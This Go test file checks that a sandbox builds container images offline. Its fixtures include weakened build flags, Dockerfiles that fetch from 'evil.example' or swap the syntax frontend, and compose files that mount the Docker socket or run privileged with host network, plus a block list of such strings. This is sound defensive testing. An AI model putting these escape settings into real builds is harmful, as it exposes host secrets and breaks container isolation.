package sandbox

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"
)

const builtImage = "sha256:" + fakeID

// withBuilds makes rec answer a build like a runtime: the build exits with
// exit and, on success, writes the image ID to the iidfile. Base images
// are present unless listed in missing.
func withBuilds(rec *recorder, exit int, missing ...string) *recorder {
	inner := rec.reply
	rec.reply = func(ctx context.Context, args []string) (cliResult, error) {
		if subcommand(args) != "build" {
			if inner == nil {
				return cliResult{}, nil
			}
			return inner(ctx, args)
		}
		if exit == 0 {
			writeIID(args)
		}
		return cliResult{exit: exit}, nil
	}
	if rec.images == nil {
		rec.images = map[string]cliResult{}
	}
	for _, ref := range missing {
		rec.images[ref] = cliResult{exit: 1}
	}
	return rec
}

func writeIID(args []string) {
	for _, a := range args {
		if p, ok := strings.CutPrefix(a, "--iidfile="); ok {
			_ = os.WriteFile(p, []byte(builtImage+"\n"), 0o600) //nolint:gosec // G703: the iidfile path the sandbox built in its work directory
		}
	}
}

func dockerfileRepo(dockerfile string) Repo {
	return (&memRepo{files: map[string]string{"Dockerfile": dockerfile, "app.py": "print(1)\n", ".env": "SECRET=1\n"}}).repo()
}

// requiredBuildOptions must appear in every build command line; the
// runtime-specific ones follow. Written here, not taken from the builder,
// so a builder change that weakens the build fails the test.
var (
	requiredBuildOptions = []string{"--quiet", "--network=none", "--no-cache",
		"--label=" + LabelManaged + "=true", "--label=" + LabelRun + "=" + testRunID}
	requiredBuildDocker = []string{"--pull=false"}
	requiredBuildPodman = []string{"--pull=never", "--http-proxy=false", "--layers=false", "--force-rm",
		"--memory=2g", "--memory-swap=2g", "--cpu-period=100000", "--cpu-quota=200000"}
)

// buildProblems checks one `build` argv: every required option, no option
// outside an allowlist (so a build argument, secret, SSH agent, extra
// host, entitlement, cache import, output, push, platform or other network
// is caught), and one context, a directory in the work directory, with
// the Dockerfile and the iidfile inside the work directory too.
func buildProblems(argv []string, rt Runtime, work string) []string {
	at := slices.Index(argv, "build")
	if at < 0 {
		return []string{"no build subcommand"}
	}
	opts, rest := argv[at+1:], []string(nil)
	if i := slices.IndexFunc(opts, func(a string) bool { return !strings.HasPrefix(a, "-") }); i >= 0 {
		opts, rest = opts[:i], opts[i:]
	}
	var problems []string
	if len(rest) != 1 || !inside(work, rest[0]) {
		return append(problems, "the context is not one directory in the work directory: "+strings.Join(rest, " "))
	}
	want := append(slices.Clone(requiredBuildOptions), requiredBuildDocker...)
	if rt == Podman {
		want = append(slices.Clone(requiredBuildOptions), requiredBuildPodman...)
	}
	for _, w := range want {
		if !slices.Contains(opts, w) {
			problems = append(problems, "missing "+w)
		}
	}
	for _, o := range opts {
		if !slices.Contains(want, o) && !allowedBuildOption(o, rest[0], work) {
			problems = append(problems, "not allowed: "+o)
		}
	}
	return problems
}

func allowedBuildOption(o, context, work string) bool {
	if p, ok := strings.CutPrefix(o, "--file="); ok {
		return inside(context, p)
	}
	if p, ok := strings.CutPrefix(o, "--iidfile="); ok {
		return inside(work, p) && !inside(context, p)
	}
	if t, ok := strings.CutPrefix(o, "--target="); ok {
		return stageName.MatchString(t)
	}
	return false
}

func inside(dir, p string) bool {
	rel, err := filepath.Rel(dir, p)
	return err == nil && rel != "." && filepath.IsLocal(rel)
}

// TestBuildIsOffline is the protection test for the build: on Docker and
// Podman, every build command line holds the offline options and nothing
// outside an allowlist, the endpoint stays pinned, the context is the
// staged copy, and no build reads anything creep did not check first.
func TestBuildIsOffline(t *testing.T) {
	podman := usableDocker()
	podman.Runtime, podman.Host = Podman, ""
	for _, st := range []Status{usableDocker(), podman} {
		t.Run(string(st.Runtime), func(t *testing.T) {
			rec := withBuilds(&recorder{}, 0)
			s, err := newSandbox(st, testRunID, rec.run)
			if err != nil {
				t.Fatal(err)
			}
			defer s.Close()
			repo := (&memRepo{files: map[string]string{
				"compose.yaml": "services:\n  web:\n    build:\n      context: .\n      target: run\n",
				"Dockerfile":   "FROM alpine:3 AS run\nCOPY . /app\n",
			}}).repo()
			app, err := s.Build(context.Background(), repo)
			if err != nil || !app.Built() || app.Image != builtImage {
				t.Fatalf("Build = %+v, %v", app, err)
			}
			builds := rec.to("build")
			if len(builds) != 1 {
				t.Fatalf("%d build calls", len(builds))
			}
			if p := buildProblems(builds[0], st.Runtime, s.work); len(p) > 0 {
				t.Errorf("build %q: %v", builds[0], p)
			}
			if builds[0][0] != globalArgs(st)[0] {
				t.Errorf("build %q: endpoint not pinned first", builds[0])
			}
		})
	}
}

// TestBuildCheckCatchesWeakenedBuild proves the protection can fail: each
// weakened build command line is caught.
func TestBuildCheckCatchesWeakenedBuild(t *testing.T) {
	s := testSandbox(t, &recorder{})
	ctxDir := filepath.Join(s.work, "build-1")
	good := buildArgs(s.status, testRunID, ctxDir, filepath.Join(ctxDir, "Dockerfile"), "run", filepath.Join(s.work, "iid-2"), Mirror{})
	if p := buildProblems(good, Docker, s.work); len(p) > 0 {
		t.Fatalf("the real build fails the check: %v", p)
	}
	insert := func(extra ...string) []string {
		return slices.Insert(slices.Clone(good), slices.Index(good, "build")+1, extra...)
	}
	last := len(good) - 1
	replaced := func(i int, v string) []string {
		out := slices.Clone(good)
		out[i] = v
		return out
	}
	weakened := map[string][]string{
		"host network":       insert("--network=host"),
		"default network":    insert("--network=default"),
		"build arg proxy":    insert("--build-arg=HTTP_PROXY=http://proxy.example:3128"),
		"build arg split":    insert("--build-arg", "BUILDKIT_SYNTAX=evil/frontend"),
		"secret":             insert("--secret=id=npm,src=/home/me/.npmrc"),
		"ssh agent":          insert("--ssh=default"),
		"entitlement":        insert("--allow=network.host"),
		"extra host":         insert("--add-host=registry:10.0.0.1"),
		"named context":      insert("--build-context=home=/home/me"),
		"cache import":       insert("--cache-from=registry.example/cache"),
		"output to host":     insert("--output=type=local,dest=/"),
		"push":               insert("--push"),
		"foreign platform":   insert("--platform=linux/s390x"),
		"pull always":        insert("--pull"),
		"pull true":          insert("--pull=true"),
		"privileged":         insert("--privileged"),
		"repository context": replaced(last, "/home/me/repo"),
		"second context":     append(slices.Clone(good), "/home/me/repo"),
		"dockerfile outside": replaced(slices.IndexFunc(good, func(a string) bool { return strings.HasPrefix(a, "--file=") }), "--file=/home/me/repo/Dockerfile"),
		"target flag":        replaced(slices.IndexFunc(good, func(a string) bool { return strings.HasPrefix(a, "--target=") }), "--target=--allow"),
	}
	for i, opt := range good {
		if slices.Contains(requiredBuildOptions, opt) || slices.Contains(requiredBuildDocker, opt) {
			weakened["without "+opt] = slices.Delete(slices.Clone(good), i, i+1)
		}
	}
	for name, argv := range weakened {
		if len(buildProblems(argv, Docker, s.work)) == 0 {
			t.Errorf("%s: weakened build %q passed the check", name, argv)
		}
	}
}

// TestBuildRefusesEscapes is the protection test for hostile build files:
// each compose file or Dockerfile that would reach a network, a host path,
// a secret or an image creep cannot check is refused before any build
// starts, and the result is verification unavailable, not an error. A
// compose file's runtime settings (privileges, host network, host
// volumes, devices) never reach any command line.
func TestBuildRefusesEscapes(t *testing.T) {
	compose := func(build string) Repo {
		return (&memRepo{files: map[string]string{"compose.yaml": "services:\n  web:\n    build:\n" + build, "Dockerfile": plainDockerfile}}).repo()
	}
	tests := map[string]struct {
		repo   Repo
		reason BuildReason
	}{
		"add url":            {dockerfileRepo("FROM alpine:3\nADD https://example.com/x /x\n"), BuildDockerfileRefused},
		"frontend":           {dockerfileRepo("# syntax=evil.example/frontend\nFROM alpine:3\n"), BuildDockerfileRefused},
		"variable base":      {dockerfileRepo("FROM ${BASE}\n"), BuildDockerfileRefused},
		"run host network":   {dockerfileRepo("FROM alpine:3\nRUN --network=host true\n"), BuildDockerfileRefused},
		"build args":         {compose("      args: [HTTP_PROXY=http://evil]\n"), BuildComposeRefused},
		"build secrets":      {compose("      secrets: [token]\n"), BuildComposeRefused},
		"build ssh":          {compose("      ssh: [default]\n"), BuildComposeRefused},
		"build network":      {compose("      network: host\n"), BuildComposeRefused},
		"host context":       {compose("      additional_contexts: {h: /}\n"), BuildComposeRefused},
		"context outside":    {compose("      context: ../..\n"), BuildComposeRefused},
		"remote context":     {compose("      context: https://github.com/o/r.git\n"), BuildComposeRefused},
		"no build file":      {(&memRepo{files: map[string]string{"app.py": ""}}).repo(), BuildNoFile},
		"base image missing": {dockerfileRepo("FROM missing.example/base:1\n"), BuildBaseImageMissing},
		"BOM frontend":       {dockerfileRepo("\xef\xbb\xbf# syntax=evil.example/fe\nFROM alpine:3\n"), BuildDockerfileRefused},
		"slash frontend":     {dockerfileRepo("// syntax=evil.example/fe\nFROM alpine:3\n"), BuildDockerfileRefused},
		"vertical tab FROM":  {dockerfileRepo("FROM alpine:3\nFROM\vmissing.example/base:1\n"), BuildDockerfileRefused},
		"mount From upper":   {dockerfileRepo("FROM alpine:3\nRUN --mount=type=bind,From=missing.example/base:1,target=/m true\n"), BuildDockerfileRefused},
		"numeric FROM":       {dockerfileRepo("FROM 1234\n"), BuildDockerfileRefused},
		"base onbuild":       {dockerfileRepo("FROM onbuild.example/base:1\n"), BuildImageRefused},
		"podman onbuild":     {dockerfileRepo("FROM podman.example/base:1\n"), BuildImageRefused},
		"other platform":     {dockerfileRepo("FROM arm.example/base:1\n"), BuildImageRefused},
		"onbuild":            {dockerfileRepo("FROM alpine:3 AS a\nONBUILD ADD https://evil.example/x /x\nFROM a\n"), BuildDockerfileRefused},
		"cache mount":        {dockerfileRepo("FROM alpine:3\nRUN --mount=type=cache,target=/root/.npm true\n"), BuildDockerfileRefused},
	}
	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			rec := withBuilds(&recorder{}, 0, "missing.example/base:1", "1234")
			rec.images["onbuild.example/base:1"] = cliResult{stdout: []byte(dockerInspectOnBuild)}
			rec.images["podman.example/base:1"] = cliResult{stdout: []byte(podmanInspectOnBuild)}
			rec.images["arm.example/base:1"] = cliResult{stdout: []byte(`[{"Os":"linux","Architecture":"arm64"}]`)}
			s := testSandbox(t, rec)
			app, err := s.Build(context.Background(), tt.repo)
			if err != nil || app.Built() || app.Unavailable != tt.reason {
				t.Fatalf("Build = %+v, %v; want unavailable %s", app, err, tt.reason)
			}
			if n := len(rec.to("build")); n != 0 {
				t.Errorf("%d builds started", n)
			}
		})
	}
	t.Run("runtime settings neutralized", func(t *testing.T) {
		rec := withBuilds(networkRecorder(goodCanary, 0), 0)
		s := testSandbox(t, rec)
		repo := (&memRepo{files: map[string]string{"Dockerfile": plainDockerfile, "compose.yaml": "services:\n  web:\n    build: .\n" +
			"    privileged: true\n    network_mode: host\n    pid: host\n    cap_add: [SYS_ADMIN]\n    devices: [/dev/kvm]\n" +
			"    volumes: [/var/run/docker.sock:/var/run/docker.sock]\n    extra_hosts: [evil:10.9.9.9]\n    ports: [\"80:80\"]\n"}}).repo()
		app, err := s.Build(context.Background(), repo)
		if err != nil || !app.Built() {
			t.Fatalf("Build = %+v, %v", app, err)
		}
		if err := s.StartApp(context.Background(), app); err != nil {
			t.Fatalf("StartApp: %v", err)
		}
		for _, argv := range rec.calls {
			line := strings.Join(argv, " ")
			for _, bad := range []string{"privileged", "docker.sock:/", "pid=host", "SYS_ADMIN", "/dev/kvm", "10.9.9.9", "80:80", "--network=host"} {
				if strings.Contains(line, bad) {
					t.Errorf("%q reached %q", bad, argv)
				}
			}
		}
	})
}

// TestBuildFailureIsUnavailable: a build that fails, hangs, cannot start,
// leaves no image ID or makes an image with a VOLUME is verification
// unavailable with its reason, never an error that would fail the scan.
func TestBuildFailureIsUnavailable(t *testing.T) {
	tests := map[string]struct {
		rec    func() *recorder
		reason BuildReason
		detail string
	}{
		"exit 1": {func() *recorder { return withBuilds(&recorder{}, 1) }, BuildFailed, "exit_1"},
		"engine platform unreadable": {func() *recorder {
			return withBuilds(&recorder{platform: "linux/amd64 --oops"}, 0)
		}, BuildRuntimeError, "platform"},
		"no image id": {func() *recorder {
			return &recorder{reply: func(context.Context, []string) (cliResult, error) { return cliResult{}, nil }}
		}, BuildFailed, "no_image_id"},
		"cli did not start": {func() *recorder {
			return &recorder{reply: func(_ context.Context, args []string) (cliResult, error) {
				if subcommand(args) == "build" {
					return cliResult{}, errors.New("exec: not found")
				}
				return cliResult{}, nil
			}}
		}, BuildRuntimeError, "start"},
		"hangs": {func() *recorder {
			return &recorder{reply: func(ctx context.Context, args []string) (cliResult, error) {
				if subcommand(args) == "build" {
					<-ctx.Done()
					return cliResult{}, ctx.Err()
				}
				return cliResult{}, nil
			}}
		}, BuildTimeout, ""},
		"image volume": {func() *recorder {
			rec := withBuilds(&recorder{}, 0)
			rec.images[builtImage] = cliResult{stdout: []byte(`{"/data":{}}`)}
			return rec
		}, BuildImageRefused, "volume"},
	}
	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			s := testSandbox(t, tt.rec())
			s.buildFor = 200 * time.Millisecond
			app, err := s.Build(context.Background(), dockerfileRepo(plainDockerfile))
			if err != nil || app.Built() || app.Unavailable != tt.reason || app.Detail != tt.detail {
				t.Fatalf("Build = %+v, %v; want %s %q", app, err, tt.reason, tt.detail)
			}
		})
	}
}

// TestBuildStopsWithTheRun: only Ctrl+C, the caller's cancel and an
// aborted run end Build with an error.
func TestBuildStopsWithTheRun(t *testing.T) {
	hang := func() *recorder {
		return &recorder{reply: func(ctx context.Context, args []string) (cliResult, error) {
			if subcommand(args) == "build" {
				<-ctx.Done()
				return cliResult{}, ctx.Err()
			}
			return cliResult{}, nil
		}}
	}
	t.Run("interrupt", func(t *testing.T) {
		s := testSandbox(t, hang())
		interruptSoon(s, nil)
		if _, err := s.Build(context.Background(), dockerfileRepo(plainDockerfile)); !errors.Is(err, ErrInterrupted) {
			t.Errorf("Build: %v", err)
		}
	})
	t.Run("canceled", func(t *testing.T) {
		s := testSandbox(t, hang())
		ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
		defer cancel()
		if _, err := s.Build(ctx, dockerfileRepo(plainDockerfile)); !errors.Is(err, context.DeadlineExceeded) {
			t.Errorf("Build: %v", err)
		}
	})
	t.Run("aborted run", func(t *testing.T) {
		rec := withBuilds(&recorder{}, 0)
		s := testSandbox(t, rec)
		s.abort(ErrNetworkLeak)
		if _, err := s.Build(context.Background(), dockerfileRepo(plainDockerfile)); !errors.Is(err, ErrNetworkLeak) {
			t.Errorf("Build: %v", err)
		}
		if len(rec.calls) != 0 {
			t.Errorf("calls after abort: %q", rec.calls)
		}
	})
}
